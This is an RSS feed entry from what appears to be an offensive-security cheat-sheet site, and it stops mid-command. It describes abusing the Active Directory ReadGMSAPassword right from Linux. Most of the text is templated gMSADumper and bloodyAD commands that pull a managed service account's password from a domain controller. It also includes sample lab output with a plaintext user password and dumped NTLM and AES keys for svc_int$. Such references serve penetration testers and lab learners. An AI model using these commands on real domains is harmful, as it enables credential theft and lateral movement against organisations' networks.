channel.title: ReadGMSApassword on TLDRBins
channel.description: Recent content in ReadGMSApassword on TLDRBins

item.title: ReadGMSAPassword
item.description: Abuse #1: Read GMSAPassword (From Linux) gMSADumper BloodyAD nxc python3 gMSADumper.py -u '<USER>' -p '<PASSWORD>' -l <DC> -d <DOMAIN> $ python3 gMSADumper.py -u ted.graves -p Mr.Teddy -l intelligence.htb -d intelligence.htb Users or groups who can read password for svc_int$: > DC$ > itsupport svc_int$:::745bd2c68dfc101a74f48d87027c7dc6 svc_int$:aes256-cts-hmac-sha1-96:8b2e9edb20258a45ad9084c89e7df761f3b85da5abd92849c150d4ed43f1056f svc_int$:aes128-cts-hmac-sha1-96:798345b20bd9a8866a87b351c0ad68f3 python3 gMSADumper.py -k -l <DC> -d <DOMAIN> Ref: gMSADumper bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> get object '<TARGET_OBJECT>' --attr msDS-ManagedPassword $ bloodyAD -d intelligence.
